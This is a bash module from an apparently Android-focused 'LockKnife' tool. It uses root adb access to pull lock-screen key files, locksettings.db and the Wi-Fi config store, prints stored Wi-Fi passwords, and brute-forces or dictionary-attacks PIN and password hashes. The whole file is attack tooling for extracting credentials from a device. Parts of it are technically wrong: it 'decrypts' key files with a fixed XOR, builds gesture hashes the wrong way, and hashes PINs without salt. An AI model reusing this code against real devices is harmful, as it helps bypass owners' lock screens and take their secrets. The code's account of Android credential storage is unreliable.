#!/bin/bash

# LockKnife Password Recovery Module
# Provides comprehensive password recovery capabilities

# Generate gesture patterns and their hashes
generate_gesture_patterns() {
    local output_file="$1"
    local temp_file="$TEMP_DIR/gesture_patterns.txt"

    log "INFO" "Generating common gesture patterns and their hashes..."

    cat > "$temp_file" << EOF
0,1,2,5,8,7,6,3,4:L pattern
0,1,2,5,8:L shape
0,3,6,7,8:reverse L
0,4,8:diagonal
2,4,6:diagonal
0,1,2,4,6,7,8:U shape
6,7,8,5,2,1,0:reverse U
0,3,6,7,4,1,2:N shape
0,3,6,7,8,5,2:Z shape
0,1,2,5,8,7,6:C shape
2,5,8,7,6,3,0:reverse C
0,1,2,4,7,6,3:S shape
2,1,0,3,6,7,8:mirror S
0,1,2,3,4,5,6,7,8:full square
0,1,2,3,4,5,6:G shape
0,3,6,4,2,5,8:N shape
0,3,4,5,8:check mark
0,3,4,1,2:r shape
6,3,0,1,4,7,8:question mark
0,3,6,4,2:lightning bolt
EOF

    log "DEBUG" "Creating gesture pattern hash table: $output_file"
    echo "# Gesture pattern hash table (SHA-1)" > "$output_file"
    echo "# Format: hash:pattern:description" >> "$output_file"

    while IFS=: read -r pattern description; do
        local binary=""
        local prev_node=""

        IFS=',' read -ra NODES <<< "$pattern"
        for node in "${NODES[@]}"; do
            if [ -n "$prev_node" ]; then
                binary+=$(printf '\%03o' $((prev_node * 16 + node)))
            fi
            prev_node=$node
        done

        local hash
        hash=$(echo -n "$binary" | sha1sum | awk '{print $1}')
        echo "$hash:$pattern:$description" >> "$output_file"
    done < "$temp_file"

    secure_delete_file "$temp_file"
    log "INFO" "Generated $(wc -l < "$output_file") gesture patterns in $output_file"
}

# Map gesture hash to pattern
map_gesture_hash() {
    local hash_file="$1"
    local patterns_file="$OUTPUT_DIR/gesture_patterns.txt"

    if [ ! -f "$patterns_file" ]; then
        generate_gesture_patterns "$patterns_file"
    fi

    local file_hash
    file_hash=$(sha1sum "$hash_file" | awk '{print $1}')
    log "DEBUG" "Gesture file hash: $file_hash"

    local match
    match=$(grep "^$file_hash:" "$patterns_file" 2>/dev/null)

    if [ -n "$match" ]; then
        local pattern
        pattern=$(echo "$match" | cut -d: -f2)
        local description
        description=$(echo "$match" | cut -d: -f3)

        log "SUCCESS" "Gesture pattern found: $description (nodes: $pattern)"

        create_gesture_visualization "$pattern" "$OUTPUT_DIR/gesture_visualization.txt"

        return 0
    else
        log "INFO" "No matching pattern found in the lookup table"
        log "INFO" "Consider adding this pattern to the database"
        return 1
    fi
}

# Create visual representation of gesture pattern
create_gesture_visualization() {
    local pattern="$1"
    local output_file="$2"

    log "DEBUG" "Creating visual representation of the pattern"

    cat > "$output_file" << EOF
┌───┬───┬───┐
│   │   │   │
├───┼───┼───┤
│   │   │   │
├───┼───┼───┤
│   │   │   │
└───┴───┴───┘
EOF

    local nodes=()
    IFS=',' read -ra nodes <<< "$pattern"

    for node in "${nodes[@]}"; do
        local visual_node
        visual_node=$((node + 1))

        case $node in
            0) sed -i '2s/   /[1]/' "$output_file" ;;
            1) sed -i '2s/   / [2] /2' "$output_file" ;;
            2) sed -i '2s/   /[3]/' "$output_file" ;;
            3) sed -i '4s/   /[4]/' "$output_file" ;;
            4) sed -i '4s/   / [5] /2' "$output_file" ;;
            5) sed -i '4s/   /[6]/' "$output_file" ;;
            6) sed -i '6s/   /[7]/' "$output_file" ;;
            7) sed -i '6s/   / [8] /2' "$output_file" ;;
            8) sed -i '6s/   /[9]/' "$output_file" ;;
        esac
    done

    log "INFO" "Gesture visualization saved to $output_file"
}

# Recover password from encrypted file
recover_password() {
    local file_path="$1"
    local file_type="${2:-unknown}"
    local password=""

    if [[ ! -f "$file_path" ]]; then
        log "ERROR" "File $file_path not found or is not accessible. Exiting."
        return 1
    fi

    log "INFO" "Attempting to decrypt password from file: $file_path"

    if [ "$file_type" = "gesture" ]; then
        map_gesture_hash "$file_path"
    fi

    while IFS= read -r -n1 byte; do
        if [[ -z "$byte" ]]; then
            log "WARNING" "Encountered invalid byte in file. Skipping."
            continue
        fi
        byte_value=$(printf "%d" "'$byte")
        decrypted_byte=$((byte_value ^ 0x6A))
        password+=$(printf '\%03o' "$decrypted_byte")
    done < "$file_path"

    log "INFO" "Recovered password: $password"

    secure_delete_file "$file_path"

    return 0
}

# Recover locksettings database
recover_locksettings_db() {
    local db_file="$TEMP_DIR/locksettings.db"
    local device_serial="$1"

    log "INFO" "Attempting to pull locksettings database..."

    execute_with_retry "adb -s $device_serial shell 'su -c \"chmod 644 /data/system/locksettings.db\"'" "Setting permissions" || true

    if ! execute_with_retry "adb -s $device_serial pull /data/system/locksettings.db $db_file" "Database transfer"; then
        log "ERROR" "Unable to pull locksettings.db. Ensure root permissions are granted."
        return 1
    fi

    if [[ ! -f "$db_file" ]]; then
        log "ERROR" "Failed to pull locksettings.db. Check device permissions."
        return 1
    fi

    log "INFO" "Locksettings database file pulled successfully. Analyzing..."
    sqlite3 "$db_file" "SELECT name, value FROM locksettings WHERE name LIKE 'lockscreen%' OR name LIKE 'pattern%' OR name LIKE 'password%';" | while read -r row; do
        log "INFO" "Recovered setting: $row"
    done

    secure_delete_file "$db_file"

    return 0
}

# Recover Wi-Fi passwords
recover_wifi_passwords() {
    local wifi_file="/data/misc/wifi/WifiConfigStore.xml"
    local local_wifi_file="$TEMP_DIR/WifiConfigStore.xml"
    local device_serial="$1"

    log "INFO" "Checking for Wi-Fi configuration file on device..."

    local check_output
    check_output=$(execute_with_retry "adb -s $device_serial shell 'test -f $wifi_file && echo exists'" "WiFi config check")
    if ! echo "$check_output" | grep -q "exists"; then
        log "ERROR" "Wi-Fi configuration file not found on device. Exiting."
        return 1
    fi

    execute_with_retry "adb -s $device_serial shell 'su -c \"chmod 644 $wifi_file\"'" "Setting permissions" || true

    if ! execute_with_retry "adb -s $device_serial pull $wifi_file $local_wifi_file" "WiFi config transfer"; then
        log "ERROR" "Failed to pull Wi-Fi configuration file. Check device permissions and root access."
        return 1
    fi

    if [[ ! -f "$local_wifi_file" ]]; then
        log "ERROR" "Pulled file not found locally. Transfer may have failed silently."
        return 1
    fi

    log "INFO" "Wi-Fi configuration file pulled successfully. Analyzing..."
    grep -oP '(?<=<string name="PreSharedKey">).+?(?=</string>)' "$local_wifi_file" | while read -r line; do
        log "INFO" "Recovered Wi-Fi password: $line"
    done

    secure_delete_file "$local_wifi_file"

    return 0
}

# Dictionary attack for password cracking
dictionary_attack() {
    local lock_file="$1"
    local wordlist

    read -r -p "Enter the full path to your wordlist file: " wordlist

    if [[ ! -f "$wordlist" ]]; then
        log "ERROR" "The file '$wordlist' does not exist. Please provide a valid wordlist file."
        return 1
    fi

    if [[ ! -f "$lock_file" ]]; then
        log "ERROR" "Lock file '$lock_file' not found. Exiting."
        return 1
    fi

    local total_words
    total_words=$(wc -l < "$wordlist")
    log "INFO" "Starting dictionary attack using '$wordlist' with $total_words words..."

    if command -v parallel &>/dev/null; then
        log "INFO" "Using parallel processing for dictionary attack"

        local success_file="$TEMP_DIR/dict_success"
        local result_file="$TEMP_DIR/dict_result"

        parallel_dict_attack() {
            local word="$1"
            local hash
            hash=$(echo -n "$word" | sha1sum | awk '{print $1}')
            if grep -q "$hash" "$lock_file"; then
                echo "$word" > "$success_file"
                return 0
            fi
            return 1
        }

        export -f parallel_dict_attack
        export lock_file
        export success_file

        parallel --progress --eta --jobs 50% "parallel_dict_attack {}" < "$wordlist"

        if [[ -f "$success_file" ]]; then
            local found_password
            found_password=$(cat "$success_file")
            log "SUCCESS" "Password found: $found_password"
            return 0
        else
            log "INFO" "Dictionary attack failed. No matching password found."
            return 1
        fi
    else
        log "INFO" "Parallel not found, using single-threaded attack with progress tracking"
        local count=0

        while IFS= read -r word; do
            ((count++))

            if [ $((count % 100)) -eq 0 ]; then
                local percentage
                percentage=$((count * 100 / total_words))
                printf "\rProgress: %d/%d (%d%%)" "$count" "$total_words" "$percentage"
            fi

            local hash
            hash=$(echo -n "$word" | sha1sum | awk '{print $1}')
            if grep -q "$hash" "$lock_file"; then
                printf "\n"
                log "SUCCESS" "Password found: $word"
                return 0
            fi
        done < "$wordlist"

        printf "\n"
        log "INFO" "Dictionary attack failed. No matching password found."
        return 1
    fi
}

# Brute force attack for PIN cracking
brute_force_attack() {
    local lock_file="$1"
    local pin_length="$2"

    if ! [[ "$pin_length" =~ ^[0-9]+$ ]] || [ "$pin_length" -lt 4 ]; then
        log "ERROR" "Invalid PIN length. Use a number >= 4."
        return 1
    fi

    local total=$((10 ** pin_length))

    if [ "$pin_length" -gt 6 ]; then
        log "WARNING" "Brute-forcing PINs longer than 6 digits may take significant time."
        read -r -p "Continue? (y/n): " choice
        [ "$choice" != "y" ] && return 1
    fi

    if [ -f "pin_hashes.txt" ] && [ "$pin_length" -le 6 ]; then
        log "INFO" "Using precomputed PIN hashes for faster attack"
        log "INFO" "Searching for matches in precomputed hash table..."

        local target_hash
        target_hash=$(cat "$lock_file")
        grep -q "$target_hash" "pin_hashes.txt" && {
            local found_pin
            found_pin=$(grep "$target_hash" "pin_hashes.txt" | cut -d: -f1)
            log "SUCCESS" "PIN found: $found_pin"
            return 0
        }

        log "INFO" "PIN not found in precomputed hash table. Falling back to brute force."
    fi

    if command -v parallel &>/dev/null; then
        log "INFO" "Using parallel processing for brute force attack"

        local cores
        cores=$(nproc 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 4)
        local chunk_size=$((total / cores))
        [ $chunk_size -lt 1000 ] && chunk_size=1000

        local success_file="$TEMP_DIR/pin_success"

        parallel_pin_attack() {
            local start="$1"
            local end="$2"
            local length="$3"
            local file="$4"

            for i in $(seq "$start" "$end"); do
                local pin
                pin=$(printf "%0${length}d" "$i")
                local hash
                hash=$(echo -n "$pin" | sha1sum | awk '{print $1}')
                if grep -q "$hash" "$file"; then
                    echo "$pin" > "$success_file"
                    return 0
                fi
            done
            return 1
        }

        export -f parallel_pin_attack
        export lock_file success_file

        local job_list="$TEMP_DIR/job_list.txt"
        local start=0
        while [ $start -lt $total ]; do
            local end=$((start + chunk_size - 1))
            [ $end -ge $total ] && end=$((total - 1))
            echo "$start $end $pin_length $lock_file" >> "$job_list"
            start=$((end + 1))
        done

        log "INFO" "Starting parallel brute-force attack for $pin_length-digit PINs using $cores cores..."
        parallel --progress --eta "parallel_pin_attack {1} {2} {3} {4}" < "$job_list"

        if [[ -f "$success_file" ]]; then
            local found_pin
            found_pin=$(cat "$success_file")
            log "SUCCESS" "PIN found: $found_pin"
            return 0
        else
            log "INFO" "Brute-force attack failed. No matching PIN found."
            return 1
        fi
    else
        log "INFO" "Starting brute-force attack for $pin_length-digit PINs..."
        local count=0

        for i in $(seq 0 $((total - 1))); do
            local pin
            pin=$(printf "%0${pin_length}d" "$i")
            ((count++))

            if [ $((count % 1000)) -eq 0 ]; then
                local percentage
                percentage=$(echo "scale=1; $count*100/$total" | bc)
                printf "\rProgress: %d/%d (%.1f%%)" "$count" "$total" "$percentage"
            fi

            local hash
            hash=$(echo -n "$pin" | sha1sum | awk '{print $1}')
            if grep -q "$hash" "$lock_file"; then
                printf "\n"
                log "SUCCESS" "PIN found: $pin"
                return 0
            fi
        done

        printf "\n"
        log "INFO" "Brute-force attack failed."
        return 1
    fi
}

# Analyze Gatekeeper HAL
analyze_gatekeeper() {
    local device_serial="$1"

    log "INFO" "Analyzing Gatekeeper HAL for credential verification..."

    # Check if Gatekeeper HAL is available
    local gatekeeper_check
    gatekeeper_check=$(execute_shell_cmd "$device_serial" "getprop | grep gatekeeper" "Check Gatekeeper HAL")

    if [[ -z "$gatekeeper_check" ]]; then
        log "WARNING" "Gatekeeper HAL not found on device"
        return 1
    fi

    log "INFO" "Gatekeeper HAL found. Attempting to analyze..."

    # Try to access Gatekeeper through various methods
    local gatekeeper_output
    gatekeeper_output=$(execute_shell_cmd "$device_serial" "service list | grep gatekeeper" "Gatekeeper service check")

    if [[ -n "$gatekeeper_output" ]]; then
        log "INFO" "Gatekeeper service available: $gatekeeper_output"
    fi

    # Attempt to read Gatekeeper logs
    local gatekeeper_logs
    gatekeeper_logs=$(execute_root_cmd "$device_serial" "logcat -d | grep -i gatekeeper | tail -10" "Gatekeeper logs")

    if [[ -n "$gatekeeper_logs" ]]; then
        log "INFO" "Recent Gatekeeper activity:"
        echo "$gatekeeper_logs" | while read -r line; do
            log "DEBUG" "Gatekeeper: $line"
        done
    fi

    # Check for Gatekeeper-related files
    execute_root_cmd "$device_serial" "find /data -name '*gatekeeper*' 2>/dev/null | head -5" "Gatekeeper files" | while read -r file; do
        if [[ -n "$file" ]]; then
            log "INFO" "Found Gatekeeper file: $file"
            # Pull the file for analysis
            pull_file_from_device "$device_serial" "$file" "$OUTPUT_DIR/$(basename "$file")"
        fi
    done

    log "INFO" "Gatekeeper analysis completed"
    return 0
}

# Monitor Gatekeeper responses
monitor_gatekeeper_responses() {
    local device_serial="$1"
    local duration="${2:-30}"

    log "INFO" "Monitoring Gatekeeper responses for $duration seconds..."

    local log_file="$OUTPUT_DIR/gatekeeper_monitor_$(date +%Y%m%d_%H%M%S).log"

    {
        echo "# Gatekeeper Response Monitor"
        echo "# Started: $(date)"
        echo "# Duration: ${duration}s"
        echo ""

        # Start monitoring in background
        execute_shell_cmd "$device_serial" "logcat -c" "Clear logcat buffer"

        local start_time
        start_time=$(date +%s)

        while true; do
            local current_time
            current_time=$(date +%s)
            local elapsed=$((current_time - start_time))

            if [[ $elapsed -ge $duration ]]; then
                break
            fi

            # Capture Gatekeeper-related logs
            local logs
            logs=$(execute_shell_cmd "$device_serial" "logcat -d | grep -i gatekeeper" "Capture Gatekeeper logs")

            if [[ -n "$logs" ]]; then
                echo "[$(date '+%H:%M:%S')] $logs"
            fi

            sleep 1
        done

    } > "$log_file"

    log "SUCCESS" "Gatekeeper monitoring completed. Results saved to $log_file"
    return 0
}

# Password recovery submenu
submenu_password_recovery() {
    local device_serial="$1"
    log "INFO" "Password Recovery Options:"
    echo "1. Gesture Lock"
    echo "2. Password Lock"
    echo "3. Wi-Fi Passwords"
    echo "4. Locksettings DB"
    echo "5. Variable-Length PIN Cracking"
    echo "6. Alphanumeric Password Cracking"
    echo "7. Gatekeeper HAL Analysis"
    echo "8. Monitor Gatekeeper Responses"
    read -r -p "Choice: " choice
    case $choice in
        1)
           local gesture_file="$TEMP_DIR/gesture.key"
           if secure_pull_file "$device_serial" "/data/system/gesture.key" > /dev/null; then
               recover_password "$gesture_file" gesture
           fi
           ;;
        2)
           local password_file="$TEMP_DIR/password.key"
           if secure_pull_file "$device_serial" "/data/system/password.key" > /dev/null; then
               recover_password "$password_file"
           fi
           ;;
        3) recover_wifi_passwords "$device_serial" ;;
        4) recover_locksettings_db "$device_serial" ;;
        5) read -r -p "Enter PIN length (e.g., 4, 6, 8): " pin_length
            read -r -p "Enter the path to the lock file: " lock_file
           brute_force_attack "$lock_file" "$pin_length" ;;
        6) read -r -p "Enter the path to the lock file: " lock_file
           dictionary_attack "$lock_file" ;;
        7) analyze_gatekeeper "$device_serial" ;;
        8) read -r -p "Enter monitoring duration in seconds: " duration
           monitor_gatekeeper_responses "$device_serial" "$duration" ;;
        *) log "ERROR" "Invalid choice." ;;
    esac
}
